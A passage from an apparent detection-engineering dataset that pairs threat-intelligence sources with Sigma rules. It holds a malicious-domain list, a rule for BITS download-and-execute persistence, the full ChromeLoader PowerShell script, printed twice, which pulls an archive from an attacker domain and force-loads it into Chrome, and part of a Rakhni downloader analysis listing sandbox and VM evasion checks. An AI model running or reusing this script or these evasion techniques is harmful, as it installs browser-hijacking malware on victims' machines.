|\n| 3/26/20    | actionshunter[.]com            |\n| 5/4/20     | info-develop[.]com             |\n| 5/4/20     | ayechecker[.]com               |\n| 5/4/20     | service-booster[.]com          |\n| 9/18/20    | zapored[.]com                  |\n| 9/22/20    | gtrsqer[.]com                  |\n| 9/22/20    | chalengges[.]com               |\n| 9/22/20    | caonimas[.]com                 |\n| 9/22/20    | hakunaman[.]com                |\n| 9/22/20    | getinformationss[.]com         |\n| 9/22/20    | nomadfunclub[.]com             |\n| 9/22/20    | harddagger[.]com               |\n| 9/22/20    | errvghu[.]com                  |\n| 9/22/20    | reginds[.]com                  |\n| 9/22/20    | gameleaderr[.]com              |\n| 9/22/20    | razorses[.]com                 |\n| 9/22/20    | vnuret[.]com                   |\n| 9/22/20    | regbed[.]com                   |\n| 9/22/20    | bouths[.]com                   |\n| 9/23/20    | ayiyas[.]com                   |\n| 9/23/20    | serviceswork[.]net             |\n| 9/23/20    | moonshardd[.]com               |\n| 9/23/20    | hurrypotter[.]com              |\n| 9/23/20    | biliyilish[.]com               |\n| 9/23/20    | blackhoall[.]com               |\n| 9/23/20    | checkhunterr[.]com             |\n| 9/23/20    | daggerclip[.]com               |\n| 9/23/20    | check4list[.]com               |\n| 9/24/20    | chainnss[.]com                 |\n| 9/29/20    | hungrrybaby[.]com              |\n| 9/30/20    | martahzz[.]com                 |\n| 10/1/20    | jonsonsbabyy[.]com             |\n| 10/1/20    | wondergodst[.]com              |\n| 10/1/20    | zetrexx[.]com                  |\n| 10/1/20    | tiancaii[.]com                 |\n| 10/1/20    | cantliee[.]com                 |\n| 10/1/20    | realgamess[.]com               |\n| 10/1/20    | maybebaybe[.]com               |\n| 10/1/20    | saynoforbubble[.]com           |\n| 10/1/20    | chekingking[.]com              |\n| 10/1/20    | rapirasa[.]com                 |\n| 10/1/20    | raidbossa[.]com                |\n| 10/1/20    | mountasd[.]com                 |\n| 10/1/20    | puckhunterrr[.]com             |\n| 10/1/20    | pudgeee[.]com                  |\n| 10/1/20    | loockfinderrs[.]com            |\n| 10/1/20    | lindasak[.]com                 |\n| 10/1/20    | bithunterr[.]com               |\n| 10/1/20    | voiddas[.]com                  |\n| 10/1/20    | sibalsakie[.]com               |\n| 10/1/20    | giveasees[.]com                |\n| 10/1/20    | shabihere[.]com                |\n| 10/1/20    | tarhungangster[.]com           |\n| 10/1/20    | imagodd[.]com                  |\n| 10/1/20    | raaidboss[.]com                |\n| 10/1/20    | sunofgodd[.]com                |\n| 10/1/20    | rulemonster[.]com              |\n| 10/1/20    | loxliver[.]com                 |\n| 10/1/20    | servicegungster[.]com          |\n| 10/1/20    | kungfupandasa[.]com            |\n| 10/2/20    | check1domains[.]com            |\n| 10/5/20    | sweetmonsterr[.]com            |\n| 10/5/20    | qascker[.]com                  |\n| 10/7/20    | remotessa[.]com                |\n| 10/7/20    | cheapshhot[.]com               |\n| 10/7/20    | havemosts[.]com                |\n| 10/7/20    | unlockwsa[.]com                |\n| 10/7/20    | sobcase[.]com                  |\n| 10/7/20    | zhameharden[.]com              |\n| 10/7/20    | mixunderax[.]com               |\n| 10/7/20    | bugsbunnyy[.]com               |\n| 10/7/20    | fastbloodhunter[.]com          |\n| 10/7/20    | serviceboosterr[.]com          |\n| 10/7/20    | servicewikii[.]com             |\n| 10/7/20    | secondlivve[.]com              |\n| 10/7/20    | quwasd[.]com                   |\n| 10/7/20    | luckyhunterrs[.]com            |\n| 10/7/20    | wodemayaa[.]com                |\n| 10/7/20    | hybriqdjs[.]com                |\n| 10/7/20    | gunsdrag[.]com                 |\n| 10/7/20    | gungameon[.]com                |\n| 10/7/20    | servicemount[.]com             |\n| 10/7/20    | servicesupdater[.]com          |\n| 10/7/20    | service-boosterr[.]com         |\n| 10/7/20    | serviceupdatter[.]com          |\n| 10/7/20    | dotmaingame[.]com              |\n| 10/12/20   | backup1service[.]com           |\n| 10/13/20   | bakcup-monster[.]com           |\n| 10/13/20   | bakcup-checker[.]com           |\n| 10/13/20   | backup-simple[.]com            |\n| 10/13/20   | backup-leader[.]com            |\n| 10/13/20   | backup-helper[.]com            |\n| 10/13/20   | service-checker[.]com          |\n| 10/13/20   | nasmastrservice[.]com          |\n| 10/14/20   | service-leader[.]com           |\n| 10/14/20   | nas-simple-helper[.]com        |\n| 10/14/20   | nas-leader[.]com               |\n| 10/14/20   | boost-servicess[.]com          |\n| 10/14/20   | elephantdrrive[.]com           |\n| 10/15/20   | service-hellper[.]com          |\n| 10/16/20   | top-backuphelper[.]com         |\n| 10/16/20   | best-nas[.]com                 |\n| 10/16/20   | top-backupservice[.]com        |\n| 10/16/20   | bestservicehelper[.]com        |\n| 10/16/20   | backupnas1[.]com               |\n| 10/16/20   | backupmastter[.]com            |\n| 10/16/20   | best-backup[.]com              |\n| 10/17/20   | viewdrivers[.]com              |\n| 10/19/20   | topservicebooster[.]com        |\n| 10/19/20   | topservice-masters[.]com       |\n| 10/19/20   | topbackupintheworld[.]com      |\n| 10/19/20   | topbackup-helper[.]com         |\n| 10/19/20   | simple-backupbooster[.]com     |\n| 10/19/20   | top3-services[.]com            |\n| 10/19/20   | backup1services[.]com          |\n| 10/21/20   | backupmaster-service[.]com     |\n| 10/21/20   | backupmasterservice[.]com      |\n| 10/21/20   | service1updater[.]com          |\n| 10/21/20   | driverdwl[.]com                |\n| 10/21/20   | backup1master[.]com            |\n| 10/21/20   | boost-yourservice[.]com        |\n| 10/21/20   | checktodrivers[.]com           |\n| 10/21/20   | backup1helper[.]com            |\n| 10/21/20   | driver1updater[.]com           |\n| 10/21/20   | driver1master[.]com            |\n| 10/23/20   | view-backup[.]com              |\n| 10/23/20   | top3servicebooster[.]com       |\n| 10/23/20   | servicereader[.]com            |\n| 10/23/20   | servicehel[.]com               |\n| 10/23/20   | driver-boosters[.]com          |\n| 10/23/20   | service1update[.]com           |\n| 10/23/20   | service-hel[.]com              |\n| 10/23/20   | driver1downloads[.]com         |\n| 10/23/20   | service1view[.]com             |\n| 10/23/20   | backups1helper[.]com           |\n| 10/25/20   | idriveview[.]com               |\n| 10/26/20   | debug-service[.]com            |\n| 10/26/20   | idrivedwn[.]com                |\n| 10/28/20   | driverjumper[.]com             |\n| 10/28/20   | service1boost[.]com            |\n| 10/28/20   | idriveupdate[.]com             |\n| 10/28/20   | idrivehepler[.]com             |\n| 10/28/20   | idrivefinder[.]com             |\n| 10/28/20   | idrivecheck[.]com              |\n| 10/28/20   | idrivedownload[.]com           |\n\n---\n\nPosted in Threat Intelligence, Security & Identity",
    "sigma_rule": {
      "title": "Monitoring For Persistence Via BITS",
      "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
      "status": "test",
      "description": "BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\nWhen the job runs on the system the command specified in the BITS job will be executed.\nThis can be abused by actors to create a backdoor within the system and for persistence.\nIt will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\n",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
        "http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html",
        "https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394"
      ],
      "author": "Sreeman",
      "date": "2020-10-29",
      "modified": "2024-01-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_cli_notify_1": {
          "CommandLine|contains": "/SetNotifyCmdLine"
        },
        "selection_cli_notify_2": {
          "CommandLine|contains": [
            "%COMSPEC%",
            "cmd.exe",
            "regsvr32.exe"
          ]
        },
        "selection_cli_add_1": {
          "CommandLine|contains": "/Addfile"
        },
        "selection_cli_add_2": {
          "CommandLine|contains": [
            "http:",
            "https:",
            "ftp:",
            "ftps:"
          ]
        },
        "condition": "selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_potential_persistence.yml",
    "id": "78"
  },
  {
    "url": "https://emkc.org/s/RJjuLa",
    "markdown": "Language: powershell\n\n```\n$extPath = \"$($env:LOCALAPPDATA)\\chrome\"\n$confPath = \"$extPath\\conf.js\"\n$archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\"\n$taskName = \"ChromeLoader\"\n$domain = \"brokenna.work\"\n\n$isOpen = 0\n$dd = 0\n$ver = 0\n\n(Get-WmiObject Win32_Process -Filter \"name='chrome.exe'\") | Select-Object CommandLine | ForEach-Object {\n\tif($_ -Match \"load-extension\"){\n\t\tbreak\n\t}\n\n\t$isOpen = 1\n}\n\nif($isOpen){\n\n\tif(-not(Test-Path -Path \"$extPath\")){\n\n\t\ttry{\n\t\t\twget \"https://$domain/archive.zip\" -outfile \"$archiveName\"\n\t\t}catch{\n\t\t\tbreak\n\t\t}\n\n\t\tExpand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force\n\t\tRemove-Item \u0013 path \"$archiveName\" -Force\n\n\t}\n\telse{\n\n\t\ttry{\n\t\t\tif (Test-Path -Path \"$confPath\")\n\t\t\t{\n\t\t\t\t$conf = Get-Content -Path $confPath\n\t\t\t\t$conf.Split(\";\") | ForEach-Object {\n\t\t\t\t\tif ($_ -Match \"dd\")\n\t\t\t\t\t{\n\t\t\t\t\t\t$dd = $_.Split('\"')[1]\n\t\t\t\t\t}elseif ($_ -Match \"ExtensionVersion\")\n\t\t\t\t\t{\n\t\t\t\t\t\t$ver = $_.Split('\"')[1]\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}catch{}\n\n\t\tif ($dd -and $ver){\n\n\n\t\t\ttry{\n\n\t\t\t\t$un = wget \"https://$domain/un?did=$dd&ver=$ver\"\n\n\t\t\t\tif($un -Match \"$dd\"){\n\t\t\t\t\tUnregister-ScheduledTask -TaskName \"$taskName\" -Confirm:$false\n\t\t\t\t\tRemove-Item \u0013 path \"$extPath\" -Force -Recurse\n\t\t\t\t}\n\n\t\t\t}catch{}\n\n\t\t\ttry{\n\t\t\t\twget \"https://$domain/archive.zip?did=$dd&ver=$ver\" -outfile \"$archiveName\"\n\t\t\t}\n\t\t\tcatch{}\n\n\t\t\tif (Test-Path -Path \"$archiveName\"){\n\t\t\t\tExpand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force\n\t\t\t\tRemove-Item \u0013 path \"$archiveName\" -Force\n\t\t\t}\n\n\t\t}\n\n\t}\n\n\ttry{\n\t\tGet-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}\n\t\tstart chrome --load-extension=\"$extPath\", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble\n\t}catch{}\n\n}\n```",
    "sigma_rule": {
      "title": "Chromium Browser Instance Executed With Custom Extension",
      "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
      "related": [
        {
          "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a Chromium based browser process with the 'load-extension' flag to start a instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Usage of Chrome Extensions in testing tools such as BurpSuite will trigger this alert"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_load_extension.yml",
    "id": "86"
  },
  {
    "url": "https://emkc.org/s/RJjuLa",
    "markdown": "Language: powershell\n\n```\n$extPath = \"$($env:LOCALAPPDATA)\\chrome\"\n$confPath = \"$extPath\\conf.js\"\n$archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\"\n$taskName = \"ChromeLoader\"\n$domain = \"brokenna.work\"\n\n$isOpen = 0\n$dd = 0\n$ver = 0\n\n(Get-WmiObject Win32_Process -Filter \"name='chrome.exe'\") | Select-Object CommandLine | ForEach-Object {\n\tif($_ -Match \"load-extension\"){\n\t\tbreak\n\t}\n\n\t$isOpen = 1\n}\n\nif($isOpen){\n\n\tif(-not(Test-Path -Path \"$extPath\")){\n\n\t\ttry{\n\t\t\twget \"https://$domain/archive.zip\" -outfile \"$archiveName\"\n\t\t}catch{\n\t\t\tbreak\n\t\t}\n\n\t\tExpand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force\n\t\tRemove-Item \u0013 path \"$archiveName\" -Force\n\n\t}\n\telse{\n\n\t\ttry{\n\t\t\tif (Test-Path -Path \"$confPath\")\n\t\t\t{\n\t\t\t\t$conf = Get-Content -Path $confPath\n\t\t\t\t$conf.Split(\";\") | ForEach-Object {\n\t\t\t\t\tif ($_ -Match \"dd\")\n\t\t\t\t\t{\n\t\t\t\t\t\t$dd = $_.Split('\"')[1]\n\t\t\t\t\t}elseif ($_ -Match \"ExtensionVersion\")\n\t\t\t\t\t{\n\t\t\t\t\t\t$ver = $_.Split('\"')[1]\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}catch{}\n\n\t\tif ($dd -and $ver){\n\n\n\t\t\ttry{\n\n\t\t\t\t$un = wget \"https://$domain/un?did=$dd&ver=$ver\"\n\n\t\t\t\tif($un -Match \"$dd\"){\n\t\t\t\t\tUnregister-ScheduledTask -TaskName \"$taskName\" -Confirm:$false\n\t\t\t\t\tRemove-Item \u0013 path \"$extPath\" -Force -Recurse\n\t\t\t\t}\n\n\t\t\t}catch{}\n\n\t\t\ttry{\n\t\t\t\twget \"https://$domain/archive.zip?did=$dd&ver=$ver\" -outfile \"$archiveName\"\n\t\t\t}\n\t\t\tcatch{}\n\n\t\t\tif (Test-Path -Path \"$archiveName\"){\n\t\t\t\tExpand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force\n\t\t\t\tRemove-Item \u0013 path \"$archiveName\" -Force\n\t\t\t}\n\n\t\t}\n\n\t}\n\n\ttry{\n\t\tGet-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}\n\t\tstart chrome --load-extension=\"$extPath\", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble\n\t}catch{}\n\n}\n```",
    "sigma_rule": {
      "title": "Suspicious Chromium Browser Instance Executed With Custom Extension",
      "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
      "related": [
        {
          "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_susp_load_extension.yml",
    "id": "89"
  },
  {
    "url": "https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/",
    "markdown": "# To crypt, or to mine – that is the question\n\n**Research** \n**05 Jul 2018** \n\n---\n\nWay back in 2013 our malware analysts spotted the first malicious samples related to the Trojan-Ransom.Win32.Rakhni family. That was the starting point for this long-lived Trojan family, which is still functioning to this day. During that time the malware writers have changed:\n\n- the way their Trojans get keys (from locally generated to received from the C&C);\n- the algorithms used (from using only a symmetric algorithm, through a commonly used scheme of symmetric + asymmetric, to 18 symmetric algorithms used simultaneously);\n- the crypto-libraries (LockBox, AESLib, DCPcrypt);\n- the distribution method (from spam to remote execution).\n\nNow the criminals have decided to add a new feature to their creation – a mining capability. In this article we describe a downloader that decides how to infect the victim: with a cryptor or with a miner.\n\n## Distribution\n\n### Geography of attacks\n\n```image\nAlt: Geography of Trojan-Downloader.Win32.Rakhni\nDescription: The image is a world map highlighting the geographic distribution of attacks by the Trojan-Downloader.Win32.Rakhni malware. The map uses color coding to indicate the level of attacks in different countries. The areas primarily affected, particularly the Russian Federation, are marked in red, while other locations are shaded in yellow and green, indicating lesser or no attacks. This visual representation complements the data presented in the accompanying table, providing a clear geographic context for the malware's impact.\nTranscription: |\n  - Red: Indicates a specific region or country (not specified in the image).\n  - Yellow: Indicates another category of regions or countries (not specified in the image).\n  - Green: Indicates yet another category of regions or countries (not specified in the image).\n  - White: Indicates regions or countries that are not categorized.\n```\n\n*Geography of Trojan-Downloader.Win32.Rakhni*\n\nTop five countries attacked by Trojan-Downloader.Win32.Rakhni (ranked by percentage of users attacked):\n\n|   | Country            | %      |\n| - | ------------------ | ------ |\n| 1 | Russian Federation | 95.57% |\n| 2 | Kazakhstan         | 1.36%  |\n| 3 | Ukraine            | 0.57%  |\n| 4 | Germany            | 0.49%  |\n| 5 | India              | 0.41%  |\n\n*Percentage of unique users attacked in each country by Trojan-Downloader.Win32.Rakhni, relative to all users attacked by this malware*\n\n### Infection vector\n\nAs far as we know, spam campaigns are still the main way of distributing this malware.\n\n```image\nAlt: Email with malicious attachment\nDescription: The image shows an email interface displaying a message from a user named \"Настя\" with the email address <nastyа.varlamova.1998@list.ru>. The subject line indicates it is about an account reconciliation dated 18.05.2018. The body of the email is in Russian, stating that it responds to a request and mentions an attached document titled 'Акт сверки.docx' with a size of 1 MB. The email is formatted in plain text, and there are indications that extra line breaks have been removed from the message. This email is likely part of a phishing attempt, prompting the user to open a malicious attachment.\nTranscription: |\n  Настя <nastyа.varlamova.1998@list.ru>  \n  Акт сверки за 18.05.2018  \n  \n  Добрый день  \n  Отвечаю на ваш запрос. Во вложении акт сверки за 1 квартал. Просьба ознакомиться и прокомментировать.  \n  Анастасия\n```\n\n*Email with malicious attachment*\n\nAfter opening the email attachment, the victim is prompted to save the document and enable editing.\n\n```image\nAlt: Attached Word document\nDescription: The image shows a screenshot of a Microsoft Word document displayed in Protected View. The document includes a warning message about potential viruses in email attachments, advising the user to enable editing with a button prompt. The content of the document appears to be in Russian, indicating that it was created using Microsoft Office 365 Online. It shows a table with two columns, one labeled \"Акт сверки (1 квартал)\" and the other containing an embedded PDF file icon labeled \"1_квартал.pdf.\" The overall context suggests that this document is part of a phishing attempt to lure users into opening a malicious PDF.\nTranscription: |\n  Документ создан с использованием технологии Microsoft Office 365 Online©\n  \n  Данная технология не поддерживает работу в браузере и на мобильных устройствах. Для работы с документом сохраните его на своем рабочем компьютере и разрешите его редактирование, нажав кнопку «Разрешить редактирование».\n  \n  | Акты сверки (1 квартал) |                  |\n  | ----------------------- | ---------------- |\n  |                         | ![1_квартал.pdf] |\n```\n\n*Attached Word document*\n\nThe victim is expected to double-click on the embedded PDF file. But instead of opening a PDF the victim launches a malicious executable.\n\n```image\nAlt: UAC window shown before the Trojan starts\nDescription: The image depicts a User Account Control (UAC) window on a Windows operating system. The dialog prompts the user with the message asking if they want to allow a program named 'AdobeReaderPlugin.exe' from an unknown publisher to make changes to the computer. It highlights security concerns related to executing unknown programs, particularly in the context of malware distribution through email attachments.\nTranscription: |\n  Акт сверки (1 квартал)\n  \n  User Account Control\n  Do you want to allow the following program from an unknown publisher to make changes to this computer?\n  \n  Program name: AdobeReaderPlugin.exe\n  Publisher: Unknown\n  File origin: Hard drive on this computer\n  \n  Show details\n  [ Yes ] [ No ]\n  Change when these notifications appear\n```\n\n*UAC window shown before the Trojan starts*\n\n## Downloader\n\n### General information\n\nThe downloader is an executable file written in Delphi. To complicate analysis, all strings inside the malware are encrypted with a simple substitution cipher.\n\nAfter execution, the downloader displays a message box with an error text. The purpose of this message is to explain to the victim why no PDF file opened.\n\n```image\nAlt: Fake error message\nDescription: The image depicts a fake error message window that resembles a typical software error notification. It displays the title 'Adobereaderplugin' at the top and includes a message stating 'Error(1022): CommonCTL.dll not found.' There is a button labeled 'OK' for the user to dismiss the message. The design mimics that of Adobe software, showcasing an attempt to deceive users regarding the legitimacy of the executable.\nTranscription: |\n  AdobeReaderPlugin\n  \n  Error(1022): CommonCTL.dll not found.\n  \n  [ OK ]\n```\n\n*Fake error message*\n\nTo hide the presence of the malicious software in the system the malware developer made their creation look like the products of Adobe Systems. This is reflected in the icon, the name of the executable file and the fake digital signature that uses the name Adobe Systems Incorporated. In addition, before installing the payload the downloader sends an HTTP request to the address www.adobe.com.\n\n### Environment checks\n\nAfter the message box is closed the malware performs a number of checks on the infected machine:\n\n- **Self path check**\n  - The name should contain the substring AdobeReader\n  - The path should contain one of the following substrings:\n    - \\TEMP\n    - \\TMP\n    - \\STARTUP\n    - \\CONTENT.IE\n  - **Registry check** \n    Checks that in the registry there is no value `HKCU\\Software\\Adobe\\DAVersion` and, if so, the malware creates the value `HKCU\\Software\\Adobe\\DAVersion = True` and continues its work.\n- **Running processes check**\n  - Checks that the count of running processes is greater than 26\n  - Checks that none of the processes listed in the table below are present.\n\n| alive.exe              | filewatcherservice.exe | ngvmsvc.exe             | sandboxierpcss.exe                  |\n| ---------------------- | ---------------------- | ----------------------- | ----------------------------------- |\n| analyzer.exe           | fortitracer.exe        | nsverctl.exe            | sbiectrl.exe                        |\n| angar2.exe             | goatcasper.exe         | ollydbg.exe             | sbiesvc.exe                         |\n| apimonitor.exe         | GoatClientApp.exe      | peid.exe                | scanhost.exe                        |\n| apispy.exe             | hiew32.exe             | perl.exe                | scktool.exe                         |\n| apispy32.exe           | hookanaapp.exe         | petools.exe             | sdclt.exe                           |\n| asura.exe              | hookexplorer.exe       | pexplorer.exe           | sftdcc.exe                          |\n| autorepgui.exe         | httplog.exe            | ping.exe                | shutdownmon.exe                     |\n| autoruns.exe           | icesword.exe           | pr0c3xp.exe             | sniffhit.exe                        |\n| autorunsc.exe          | iclicker-release.exe   | prince.exe              | snoop.exe                           |\n| autoscreenshotter.exe  | idag.exe               | procanalyzer.exe        | spkrmon.exe                         |\n| avctestsuite.exe       | idag64.exe             | processhacker.exe       | sysanalyzer.exe                     |\n| avz.exe                | idaq.exe               | processmemdump.exe      | syser.exe                           |\n| behaviordumper.exe     | immunitydebugger.exe   | procexp.exe             | systemexplorer.exe                  |\n| bindiff.exe            | importrec.exe          | procexp64.exe           | systemexplorerservice.exe           |\n| BTPTrayIcon.exe        | imul.exe               | procmon.exe             | sython.exe                          |\n| capturebat.exe         | Infoclient.exe         | procmon64.exe           | taskmgr.exe                         |\n| cdb.exe                | installrite.exe        | python.exe              | taslogin.exe                        |\n| cff explorer.exe       | ipfs.exe               | pythonw.exe             | tcpdump.exe                         |\n| clicksharelauncher.exe | iprosetmonitor.exe     | qq.exe                  | tcpview.exe                         |\n| closepopup.exe         | iragent.exe            | qqffo.exe               | timeout.exe                         |\n| commview.exe           | iris.exe               | qqprotect.exe           | totalcmd.exe                        |\n| cports.exe             | joeboxcontrol.exe      | qqsg.exe                | trojdie.kvp                         |\n| crossfire.exe          | joeboxserver.exe       | raptorclient.exe        | txplatform.exe                      |\n| dnf.exe                | lamer.exe              | regmon.exe              | virus.exe                           |\n| dsniff.exe             | LogHTTP.exe            | regshot.exe             | vx.exe                              |\n| dumpcap.exe            | lordpe.exe             | RepMgr64.exe            | winalysis.exe                       |\n| emul.exe               | malmon.exe             | RepUtils32.exe          | winapioverride32.exe                |\n| ethereal.exe           | mbarun.exe             | RepUx.exe               | windbg.exe                          |\n| ettercap.exe           | mdpmon.exe             | runsample.exe           | windump.exe                         |\n| fakehttpserver.exe     | mmr.exe                | samp1e.exe              | winspy.exe                          |\n| fakeserver.exe         | mmr.exe                | sample.exe              | wireshark.exe                       |\n| Fiddler.exe            | multipot.exe           | sandboxiecrypto.exe     | xxx.exe                             |\n| filemon.exe            | netsniffer.exe         | sandboxiedcomlaunch.exe | ZID Updater File Writer Service.exe |\n\n- **Computer name check**\n  - The name of the computer shouldn’t contain any of the following substrings:\n    - -MALTEST\n    - AHNLAB\n    - WILBERT-\n    - FIREEYES-\n    - CUCKOO\n    - RSWT-\n    - FORTINET-\n    - GITSTEST\n  - Calculates an MD5 digest of the computer name in lower case and compares it with a hundred denylisted values.\n- **IP address check** \n  Obtains the external IP address of the machine and compares it with hardcoded values.\n- **Virtual machine check**\n  - Checks that the following registry keys don’t exist:\n    - `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Oracle VM VirtualBox Guest Additions`\n    - `HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions`\n    - `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sandboxie`\n    - `HKLM\\SYSTEM\\ControlSet002\\Enum\\VMBUS`\n    - `HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX`\n    - `HKLM\\HARDWARE\\ACPI\\DSDT\\VirtualBox`\n    - `HKLM\\HARDWARE\\ACPI\\DSDT\\Parallels Workstation`\n    - `HKLM\\HARDWARE\\ACPI\\DSDT\\PRLS`\n    - `HKLM\\HARDWARE\\ACPI\\DSDT\\Virtual PC`\n    - `HKLM\\HARDWARE\\ACPI\\SDT\\AMIBI`\n    - `HKLM\\HARDWARE\\ACPI\\DSDT\\VMware Workstation`\n    - `HKLM\\HARDWARE\\ACPI\\DSDT\\PTLTD`\n    - `HKLM\\SOFTWARE\\SandboxieAutoExec`\n    - `HKLM\\SOFTWARE\\Classes\\Folder\\shell\\sandbox`\n  - Checks that the following registry values don’t exist:\n    - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\OpenGLDrivers\\VBoxOGL\\Dll=VBoxOGL.dll`\n    - `HKLM\\\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum\\0=Virtual`\n    - `HKLM\\\\SYSTEM\\ControlSet001\\Control\\SystemInformation\\SystemProductName=VirtualBox`\n  - Checks that none of the processes listed in the table below are present.\n\n| prlcc.exe         | VGAuthService.exe | vmsrvc.exe             | vmware-tray.exe            |\n| ----------------- | ----------------- | ---------------------- | -------------------------- |\n| prltools.exe      | vmacthlp.exe      | vmtoolsd.exe           | vmware-usbarbitrator.exe   |\n| SharedIntApp.exe  | vmicsvc.exe       | vmusrvc.exe            | vmware-usbarbitrator64.exe |\n| TPAutoConnect.exe | vmnat.exe         | vmware-authd.exe       | vmwaretray.exe             |\n| TPAutoConnSvc.exe | vmnetdhcp.exe     | vmware-converter-a.exe | vmwareuser.exe             |\n| VBoxService.exe   | vmount2.exe       | vmware-converter.exe   | xenservice.exe             |\n| VBoxTray.exe      | VMRemoteGuest.exe | vmware-hostd.exe       |                            |\n\nIf at least one of the performed checks fails, the downloader ends the process.\n\n### Installation of certificates\n\nThe downloader installs a root certificate that’s stored in its resources. All downloaded malicious executables are signed with this certificate. We have found fake certificates that claim to have been issued by Microsoft Corporation and Adobe Systems Incorporated.\n\n```image\nAlt: Fake Microsoft Corporation certificate\nDescription: The image shows a certificate information window indicating that a CA Root certificate is not trusted. It includes details such as 'Issued to' and 'Issued by' both stating 'Microsoft Corporation.' The validity period is displayed from February 28, 2018, to January 1, 2040. A warning icon signifies that the certificate needs to be installed in the Trusted Root Certification Authorities store for trust.\nTranscription: |\n  Certificate\n  \n  Certificate Information\n  This CA Root certificate is not trusted. To enable trust, install this certificate in the Trusted Root Certification Authorities store.\n  \n  Issued to:          Microsoft Corporation\n  Issued by:         Microsoft Corporation\n  Valid from:        28.02.2018 to 01.01.2040\n  \n  [Install Certificate...] [Issuer Statement] [OK]\n```\n\n*Fake Microsoft Corporation certificate*\n\n```image\nAlt: Fake Adobe Systems Incorporated certificate\nDescription: The image displays a certificate information window indicating a CA Root certificate that is not trusted. It shows details such as 'Issued to' and 'Issued by' both stating 'Adobe Systems Incorporated.' The certificate is marked with a warning icon, emphasizing that trust must be enabled by installing it in the Trusted Root Certification Authorities store. The validity dates are also shown, ranging from May 1, 2018, to January 1, 2040.\nTranscription: |\n  Certificate Information\n  This CA Root certificate is not trusted. To enable trust, install this certificate in the Trusted Root Certification Authorities store.\n  \n  Issued to:             Adobe Systems Incorporated\n  Issued by:             Adobe Systems Incorporated\n  Valid from:            01.05.2018 to 01.01.2040\n  \n  [Install Certificate...] [Issuer Statement] [OK]\n```\n\n*Fake Adobe Systems Incorporated certificate*\n\nCertificates are installed using the standard utility CertMgr.exe that’s also stored in the downloader’s resources.\n\n```image\nAlt: Resources contained in the downloader executable 